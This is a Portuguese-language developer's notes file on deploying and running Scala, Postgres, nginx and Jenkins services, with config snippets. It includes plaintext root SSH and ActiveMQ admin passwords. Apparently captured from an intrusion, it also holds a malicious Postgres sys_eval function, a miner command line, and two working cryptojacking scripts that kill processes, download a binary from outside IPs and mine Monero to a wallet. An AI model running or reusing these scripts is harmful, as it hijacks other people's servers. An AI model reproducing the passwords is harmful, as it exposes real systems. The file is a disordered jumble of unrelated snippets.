src/main/scala/code/actors/FreeBusyActor.scala
src/main/scala/code/api/TreatmentApi.scala
src/main/scala/code/model/BusyEvent.scala
src/main/scala/code/model/WorkHouer.scala

/* limpar cache angular
$rootScope.$on('$viewContentLoaded', function() { $templateCache.removeAll(); });
*/
outra construção
/*
myApp.run(function($rootScope, $templateCache) {
   $rootScope.$on('$viewContentLoaded', function() {
      $templateCache.removeAll();
   });
});
*/
A bit of a warning: Emptying the $templateCache might actually have unintended consequences. For instance, UI Bootstrap adds default partials directly to the $templateCache during initialization and later expects them to be there. – Strille Aug 21 '14 at 7:24
@Strille I was trying to use angular-ui-bootstrap Modal. The pop up was not visible. because $templateCache.removeAll(); any fix for it ? – Mukun Oct 9 '14 at 9:43
4
@Mukun: There's no easy fix the way I see it, other than not using removeAll() but instead just use remove() to delete the keys you need to clear. You would require some kind of bookkeeping to know which keys to delete. – Strille Oct 9 '14 at 11:53 
/*
If you are talking about cache that is been used for caching of templates without reloading whole page, then you can empty it by something like:

.controller('mainCtrl', function($scope, $templateCache) {
  $scope.clearCache = function() { 
    $templateCache.removeAll();
  }
});
And in markup:

<button ng-click='clearCache()'>Clear cache</button>

And press this button to clear cache.
*/
/*
If using Nginx, you can add this to your config:

location ^~ /scripts/app/views/ {
    expires -1;   
}
*/

/*
solução usando github
https://medium.com/angularjs-tricks/prevent-annoying-template-caching-in-angularjs-1-x-b706bf9c4056

Awesome fix buddy! :-)

BTW, I already have the current version stored in $rootScope.version, so using the same instead of ENV.build.

*/

mateus acha que default prop de boletos não usa mais
inclusive o covênio que está lá é o velho
dá pra testar local agora, ver o boleto gerado

criar projeto no git
não acrescentar oi inicializar e seguir os passos
usar https ao inves de ssh pede usuario e senha do git
instalar o PHP
digitar php e ele vai sugerir o upt-get
sudo apt-get install php5-cli

fazer git push no local
cd /var/www/html/boleto
git reset --hard HEAD
git pull

executar no raiz do projeto no git - para subir o PHP
php -S localhost:8000
http://localhost:8000/boleto.php



http://localhost:8000/boleto.php



INSERT INTO ESPECIALIDADESCLINICAS
VALUES (1, 'Prevenção');

INSERT INTO ESPECIALIDADESCLINICAS
VALUES (2, 'Odontopediatria');

INSERT INTO ESPECIALIDADESCLINICAS
VALUES (3, 'Dentística');

INSERT INTO ESPECIALIDADESCLINICAS
VALUES (4, 'Endodontia');

INSERT INTO ESPECIALIDADESCLINICAS
VALUES (5, 'Periodontia');

INSERT INTO ESPECIALIDADESCLINICAS
VALUES (6, 'Prótese');

INSERT INTO ESPECIALIDADESCLINICAS
VALUES (7, 'Cirurgia');

INSERT INTO ESPECIALIDADESCLINICAS
VALUES (9, 'Radiologia');

INSERT INTO ESPECIALIDADESCLINICAS
VALUES (0, 'Diagnóstico');

  
ls > /tmp/Jsiw
chmod 600 /tmp/Jsiw
ls > /tmp/rebots
chmod 600 /tmp/rebots
ls > /tmp/SQLL
chmod 600 /tmp/SQLL
ls > /tmp/stagingdir
chmod 600 /tmp/stagingdir
ls > /tmp/Aerve
chmod 600 /tmp/Aerve
ls > /tmp/Aerve.1
chmod 600 /tmp/Aerve.1
ls > /tmp/sshosh
chmod 600 /tmp/sshosh
ls > /tmp/SWL
chmod 600 /tmp/SWL
ls > /tmp/ywzq
chmod 600 /tmp/ywzq
ls > /tmp/Linux
chmod 600 /tmp/Linux
ls > /tmp/jks
chmod 600 /tmp/jks
ls > /tmp/mlzq
chmod 600 /tmp/mlzq

<img id="myImage" src="smiley.gif">

<script>
document.getElementById("myImage").src = "landscape.jpg";
</script>


ver badblocks
sudo badblocks -sv /dev/sda

atualizar ubuntu linux
sudo apt-get update

se der erro na mergelist
sudo rm /var/lib/apt/lists/* -vf
sudo apt-get update

rever o IP no 
boot.scala
no toolbar.html
no logincontroller.js
no securityapi

http://convertico.com/ favicon

https://github.com/clovisdasilvaneto/speechRecognition/blob/master/meu_artigo.html

https://github.com/lift/framework/blob/5033c8798d4444f81996199c10ea330770e47fbc/core/util/src/main/scala/net/liftweb/util/Mailer.scala

/**
   * Synchronously send an email.
   */
  def blockingSendMail(from: From, subject: Subject, rest: MailTypes*) {
    msgSendImpl(from, subject, rest.toList)
  }

graph chart
console.log(data.map(function(a){
	return {
		0: a[0],
		1: a[1]
	}
}));

-- Function: sys_eval999(text)

-- DROP FUNCTION sys_eval999(text);

CREATE OR REPLACE FUNCTION sys_eval999(text)
  RETURNS text AS
'/tmp/zero.so', 'sys_eval'
  LANGUAGE c IMMUTABLE STRICT
  COST 1;
ALTER FUNCTION sys_eval999(text)
  OWNER TO postgres;



454 4.7.0 Too many login attempts, please try again later. m4sm7677029ywh.36 - gsmtp

19:03:04.952 ERROR - Couldn't send mail
com.sun.mail.smtp.SMTPSendFailedException: 421 4.7.0 Temporary System Problem.  Try again later

Caused by: java.net.SocketException: Connection closed by remote host

no temp 
-rw-r--r-- 1 postgres postgres 6022 Dez 22 06:48 HJAOIDh.so
-rw-r--r-- 1 postgres postgres 1645 Dez 22 05:53 UJxvulbA.so

processo
/tmp/mpool -c 1 -M stratum+tcp://minner01%40outlook.com:x@xmr.pool.minergate.com:45560/xmr

na configuracao dos projetos blue e green
./sbt ~container:start > /dev/null - acaba com o /var/log/transitobh.access.log

etc/passwd -> testar depois um nologin no postgres

boleto
/var/www/html/boleto  é aqui
/var/www/boleto - não é lá

cria um servidor para por exemplo o ebelle.com.br
instalar
sudo npm install -g http-server

cd github/portal_salao
cd github/portalEbelle
http-server
ele vai falar a porta ai é só colocar o caminho agenda.html
localhost:8080/agenda.html
localhost:8080/agenda.html?id=company

alterar a agenda

instalar o grunt - o grunt é feito em node.js
/src/main/webapp/v2$ npm instal e/ou npm update
após alterar os controller.js ou qq .js debaixo de v2/src 
vai na pasta e dá um 
grunt concat 

para acessar via mobile a versao local 
abre terminal no local ifconfig - ve o ip na wlan
coloca no browser do mobile o ip:7171

para colocar o servidor PDF no ar na maquina local
abre um terminal especifico
vai no github ebelle pdfserver
node index

qualquer url
http://localhost:8089/?url=http://localhost:8089/?url=http://boleto.vilarika.com.br/boleto/boleto.php?data=10/08/2016&valor=69,90&nosso_numero=442&documento=442&nome=Patricia%20Otoni%20Est%C3%A9tica

relatorios no estoque - os dois do meio sao jasper
estoque consolidade
distribuiçao de estoque

rever o inventário hoje só traz se tem estoque, tem que trazer tudo e 
dar opção de nao trazer zero,  entender pq tem dois sqls com e sem unit

datas erradas na CCZS
09/03/1965
24/03/1952
04/03/1965

alterar 
default.props
photo.local=true
#-- p cessar imagens locais http-server em /var/www/html

diretorio de imagens
/var/www/html/images

ebelle-responsive.css
font-family: "Times New Roman", Times, serif;
testar tirar o bordered table - antes do zebra-striped

style="color:#C21;font_size:18px"   vermelho

ver site font awesome
https://fortawesome.github.io/Font-Awesome/icons/
http://glyphicons.com/

a diferença de config de acesso no postgres do local para produção éa porta 
local 5432
producao 5433
nos 2 o hostname e' 
localhost
não tem nada na aba tunnel na produção
e o maintenace DB e o user em produção 
gerir-me
no local
postgres
no dir de sql tem 2 pgconfigXXXX.xml

para acessar o banco novo no linode novo tunel tunnel gerir-me
ssh -f -L 5433:127.0.0.1:5432 root@45.33.99.152 -N

psql e_belle_ligth_c < log.backup

depois de ir no jenkins
backup e-belle
workspace
ebelle.gz
vai na pasta com ctrl J descompacta (clica direito e extrai)

renomear o arquivo para tirar o espaço

cd ~/Downloads

sftp gerir-me@45.33.99.152:/home/gerir-me/backup_bd/
ls -ltr 
get <nome_arquivo>

chmod 777 ebelle(n)

sudo su postgres

psql e_belle_ligth_c < ebelle
psql gerir-me < ebelle

dropa o public local antes
-- Schema: public

-- DROP SCHEMA public;

CREATE SCHEMA public
  AUTHORIZATION postgres;

GRANT ALL ON SCHEMA public TO postgres;
GRANT ALL ON SCHEMA public TO public;
COMMENT ON SCHEMA public
  IS 'standard public schema';



psql e_belle_ligth_c < ebelle

no servidor - vai no jenkins e descompacta

gzip -d ebelle(n).gz

su postgres

psql e_belle_ligth_c < ebelle(n)


./sbt update

cd github

cd E-belle-Ligth

./sbt ~jetty-run
./sbt "~;container:start; container:reload /"

cd apache-activemq-5.9.0/bin

./activemq-admin start

ps -xa | grep java

kill -9 pid

executar o grunt na pasta v2


ssh root@transitobh.com.br

senha vilarika775072

mostra se o disco está cheio
df -h

procurar
no /tmp
ls -l sbt*.log
e remover os antigos e grandes - aparece sempre que gera verao

/var/log/transito.access.log 
se tiver grande matar (RM) para e voltar o nginx

remove arvore de diretorios pra baixo sem questionar
rm xx* -r --verbose --force -f

sobre as bases do postgres
cd /var/lib/pgsql/data/base/ e os numeros que ele gera

/var/lib/pgsql/data
arquivos estranhos com extensão .dll
amp.lst - lista de ips
testtmp
66.228.57.73:54624

mostra uso de cpu
top

cat .bash_history | grep find

encontra arquivos maiores que um giga
find / -type f -size +1G -exec ls -lh {} \; | awk '{ print $9 ": " $5 }'
encontra arquivos maiores que 500 Mega 
find / -type f -size +500M -exec ls -lh {} \; | awk '{ print $9 ": " $5 }'

encontra recurssivo a partir do /
find / | grep xxxxxx

diretorio de logs do Transito
/var/lib/jenkins/jobs/TrasitoRun/builds

diretorios de logs do ebelle
/var/lib/jenkins/jobs/run_e-belle-blue/builds
/var/lib/jenkins/jobs/run_e-belle-green/builds

log do postgres
cd /var/lib/pgsql/data/pg_log/

// Alterar acesso externo ou informar IP pu comentar a linha
// meu ip na minha casa
cd /var/lib/pgsql/data
vi pg_hba.conf

log do jenkins
cd /var/log/jenkins

/etc/init.d/jenkins start

jetty stop

os arquivos de apontamento ficam em
/etc/nginx/sites-available
dentro de remessa e tissxml tem um add header que faz o download acontecer

nginx -k reload
nginx -s reload

/etc/nginx/conf.d/trans.conf

7171 7272 portas do blue e do green 

aqui ficam os dominios e para que pasta aponta - apache
vim /etc/httpd/conf/httpd.conf

su postgres

/etc/rc.d/init.d/postgresql restart


curtir no face
<div class='widget HTML' id='HTML2'>

	<h2 class='title'>Facebook</h2>

	<div class='widget-content'>

		<iframe src="//www.facebook.com/plugins/likebox.php?href=https%3A%2F%2Fwww.facebook.com%2Febellegestao&amp;width&amp;height=258&amp;colorscheme=light&amp;show_faces=true&amp;header=false&amp;stream=false&amp;show_border=true" scrolling="no" frameborder="0" style="border:none; overflow:hidden; height:258px;" allowtransparency="true"></iframe>

	</div>

	<div class='clear'></div>
</div>


		<iframe src="//www.facebook.com/plugins/likebox.php?href=https%3A%2F%2Fwww.facebook.com%2FVilaRikaSolucoes&amp;width&amp;height=258&amp;colorscheme=light&amp;show_faces=true&amp;header=false&amp;stream=false&amp;show_border=true" scrolling="no" frameborder="0" style="border:none; overflow:hidden; height:258px;" allowtransparency="true"></iframe>



no <head>
<style type="text/css">
.quebrapagina {
   page-break-before: always;
}
</style>

na quebra
<br class="quebrapagina">







service jenkins restart

Habilitar activemq no ubuntu via apt-get
sudo ln -s /etc/activemq/instances-available/main /etc/activemq/instances-enabled/main

site vila rika

/bitbucket/vilarika-site$ httpserver

http://localhost:8080/


parar

service postgresql stop
/etc/init.d/jenkins stop

o jenkins cai mas os processos do ebele podem ficar no ar

ps -aux | grep jenkins
kill -9 neles

normalmente - resolve

/etc/activemq stop

nginx -s stop
a mensagem de duplicate mime type nao e problema

service httpd stop

voltar

service postgresql start
/etc/init.d/jenkins start

nginx
a mensagem de duplicate mime type nao e problema

o ci.transitobh já funciona, mas tem que subir o active mq antes do deploy

/etc/activemq start

no browser 
mq.transitobh.com.br
usuario admin
a senha amanda1108

vai no ci e deploy ebelle
se por acaso do gitbub nao estar no ar (como aconteceu comigo e o mateus)
vai no run ebelle green e comenta o git push com #

remove os arquivos deletados
git add . -A

service httpd start

se nao subir o apache não mostra as imagens 
para ver se o apache está no ar 
http://nb.transitobh.com.br/

no ci.transitobh.com.br
construir o PDF-server

http://pm2.keymetrics.io/docs/usage/quick-start/
diretorio de logs 
cd /root/.pm2/logs
cd /var/lib/jenkins/app/gerir-me
git reset --hard HEAD
git pull
pm2 stop all        
pm2 restart all     

pm2 start gerirme.json

Se quiser que o pm2 inicie com o sistema:
pm2 startup
Os principais comandos são:
# Listing

pm2 list               # Display all processes status
# Actions

pm2 stop all           # Stop all processes
pm2 restart all        # Restart all processes

cd /var/www/html/portal_salao
git reset --hard HEAD
git pull


asset
id company status
product
barcode (tag)
dtini (primeira ocorrencia)
dtfim 
unit
centro de custo????

tipo de ativo (computador impressora, etc)

asset occorrencia
id company status
asset
data
tipo (aqui, locacao,manutencao
parceiro
local(parceiro também)
unit
centro de custo ?????
valor
obs

tipo ocorrencia
valor (positivo/negativo)
validade (meses dias)

preço de locação e unidade de tempo no produto?
usar o bom para características? ou algo do tipo?










for tr in $(ps -U $USER | egrep -v "java|ps|sh|egrep|PID" | cut -b1-6); do echo "Killing ${tr}"; kill -9 $tr || : ; done;
threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
hostHash=$(hostname -f | md5sum | cut -c1-8);
echo "${hostHash} - ${threadCount}";
d() { curl --fail $1 -o debug 2> /dev/null || wget $1 -O debug 2> /dev/null && chmod +x debug; }

test ! -e d && touch d && rm -rf debug;
test ! -e debug && (d "https://34.243.239.201/job/Insecure-Jenkins/ws/debug" || d "http://61.50.105.218:9002/job/Insecure-Jenkins/ws/debug");

p() {
  BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobob ./debug -r 2 -R 4 -o stratum+tcp://$1:$2 -u 45h4a6VQoroEmqepwHTs9u4eAg98XFcHf5wHwzm9gWuLJYFvBawBCgY73PJQdJYNMQCczVs4S8PY4LfxnPn5UsqMSW5XLge.JL8_${hostHash:-abc} -p x -t ${threadCount:-4}
}

p "pool.minexmr.com" "4444" && p "91.121.87.10" "4444" && p "pool.minexmr.com" "7777" && p "pool.minexmr.com" "80" && p "91.121.87.10" "7777"


/var/lib/jenkins/workspace/Insecure-Jenkins/debug



#!/bin/bash

for tr in $(ps -U $(whoami) | egrep -v "java|ps|sh|egrep|PID" | cut -b1-6); do kill -9 $tr 2> /dev/null || : ; done;
threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
hostHash=$(hostname -f | md5sum | cut -c1-8);
echo "${hostHash} - ${threadCount}";

_curl () {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

d() { (curl --insecure --fail $1 -o debug 2> /dev/null || wget --no-check-certificate $1 -O debug 2> /dev/null || _curl $1 > debug) && chmod +x debug; }

test ! -e d && touch d && rm -rf debug;
test ! -s debug && (d "https://54.218.74.37:8443/view/all/job/Insecure-Jenkins/ws/debug" || d "http://35.196.231.47:9080/job/Insecure-Jenkins/ws/debug" || d "http://61.50.105.218:9002/job/Insecure-Jenkins/ws/debug");
test ! -x debug && chmod +x debug;

p() {
  BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobob ./debug -r 2 -R 4 -o stratum+tcp://$1:$2 -u 45h4a6VQoroEmqepwHTs9u4eAg98XFcHf5wHwzm9gWuLJYFvBawBCgY73PJQdJYNMQCczVs4S8PY4LfxnPn5UsqMSW5XLge.JL8_${hostHash:-abc} -p x -t ${threadCount:-4}
}

p "pool.minexmr.com" "4444" && p "91.121.87.10" "4444" && p "pool.minexmr.com" "7777" && p "pool.minexmr.com" "80" && p "91.121.87.10" "7777" &&  p "91.121.87.10" "80"





gerirme

server {
    listen 443 ssl;
    listen [::]:443 ssl;

    ssl on;
    ssl_certificate /etc/nginx/ssl/gerirme.app.chained.crt;
    ssl_certificate_key /etc/nginx/ssl/gerirme.key;

    server_name gerirme.app www.gerirme.app ;

    access_log /var/log/nginx/nginx.gerirme.app.access.log;
    error_log /var/log/nginx/nginx.gerirme.app.error.log;

    location / {
        proxy_pass http://45.33.99.152:7171;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 300;
    }
}

ebelle

server {
        listen 80;
        listen [::]:80;

        server_name ebelle.com.br www.ebelle.com.br;

        root /var/www/html/portal_salao;
        index index.php index.html;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ /index.html;
                # Uncomment to enable naxsi on this location
                # include /etc/nginx/naxsi.rules
        }
}

vilarika

server {
       listen 80 default_server;
       listen [::]:80 default_server ipv6only=on;

       server_name vilarika.com.br www.vilarika.com.br;

       root /var/www/html/vilarika;
       index index.php wp-login.php index.html index.htm;

       location / {
               #try_files $uri $uri/ =404;
               # try_files $uri $uri/ /index.php?q=$uri&$args;
               try_files $uri $uri/ /index.php?$args;
       }

        error_page 404 /404.html;

        error_page 500 502 503 504 /50x.html;
        location = /50x.html {
                root /usr/share/nginx/html;
        }


